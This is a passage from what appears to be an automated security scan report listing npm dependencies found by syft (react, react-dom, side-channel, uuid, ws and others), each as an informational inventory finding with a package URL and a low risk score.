## [⚪ INFO] F-9a5de66bd74f: Dependency: react-dom@18.3.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/react-dom@18.3.1?package-id=98bcef2cdcc9941a

---
## [⚪ INFO] F-4d6acd24ac14: Dependency: react@18.3.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/react@18.3.1?package-id=405f6eb700866b5f

---
## [⚪ INFO] F-7dd1286ba50e: Dependency: safe-buffer@5.2.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/safe-buffer@5.2.1?package-id=28135efb01cb74b9

---
## [⚪ INFO] F-d27821a5c87e: Dependency: scheduler@0.23.2
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/scheduler@0.23.2?package-id=d0ebbd8a4bc7ada1

---
## [⚪ INFO] F-a7037f27db1d: Dependency: side-channel-list@1.0.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/side-channel-list@1.0.1?package-id=2e4a230ff21329f1

---
## [⚪ INFO] F-5b37e86753ee: Dependency: side-channel-map@1.0.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/side-channel-map@1.0.1?package-id=36c9d18daa63eabd

---
## [⚪ INFO] F-37ce91b1cc84: Dependency: side-channel-weakmap@1.0.2
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/side-channel-weakmap@1.0.2?package-id=3a35b0f8b53bc97a

---
## [⚪ INFO] F-f0b1c2dbc9f9: Dependency: side-channel@1.1.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/side-channel@1.1.1?package-id=b290d7c1b93f6f12

---
## [⚪ INFO] F-8f1ae1860526: Dependency: source-map-js@1.2.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/source-map-js@1.2.1?package-id=ef14348a3e7aef73

---
## [⚪ INFO] F-6fabb9f928b3: Dependency: streamsearch@1.1.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/streamsearch@1.1.0?package-id=c7163598759ab751

---
## [⚪ INFO] F-81a54a44a658: Dependency: styled-jsx@5.1.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/styled-jsx@5.1.1?package-id=b71f2c964dcb79d3

---
## [⚪ INFO] F-abecb572e124: Dependency: tailwind-merge@3.6.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/tailwind-merge@3.6.0?package-id=687e71ee8122b599

---
## [⚪ INFO] F-c1c9d4bf617c: Dependency: tr46@0.0.3
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/tr46@0.0.3?package-id=44b5fbfc3cffc498

---
## [⚪ INFO] F-a93661e55583: Dependency: tslib@2.8.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/tslib@2.8.1?package-id=732c6f5be784c8f2

---
## [⚪ INFO] F-e05bd9708ba1: Dependency: undici-types@5.26.5
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/undici-types@5.26.5?package-id=bef21f20d00681d8

---
## [⚪ INFO] F-e0d1b2bfca76: Dependency: url-template@2.0.8
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/url-template@2.0.8?package-id=eca81bdd97b0cc7d

---
## [⚪ INFO] F-529b82ca0e9c: Dependency: uuid@9.0.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/uuid@9.0.1?package-id=0bd59342bab05265

---
## [⚪ INFO] F-b5eec816d647: Dependency: webidl-conversions@3.0.1
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/webidl-conversions@3.0.1?package-id=770e2f7ad3b1c524

---
## [⚪ INFO] F-ded436d412bf: Dependency: whatwg-url@5.0.0
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/whatwg-url@5.0.0?package-id=0827d54a7a5ea1e5

---
## [⚪ INFO] F-2d67741b6d29: Dependency: ws@8.21.3
- **Location:** ``
- **Category:** `sbom` | **Source:** `syft` | **Risk Score:** `0.5/10`

**Technical Details:**
Type: library, Ref: pkg:npm/ws@8.21.3?package-id=65b72a3243e68183

---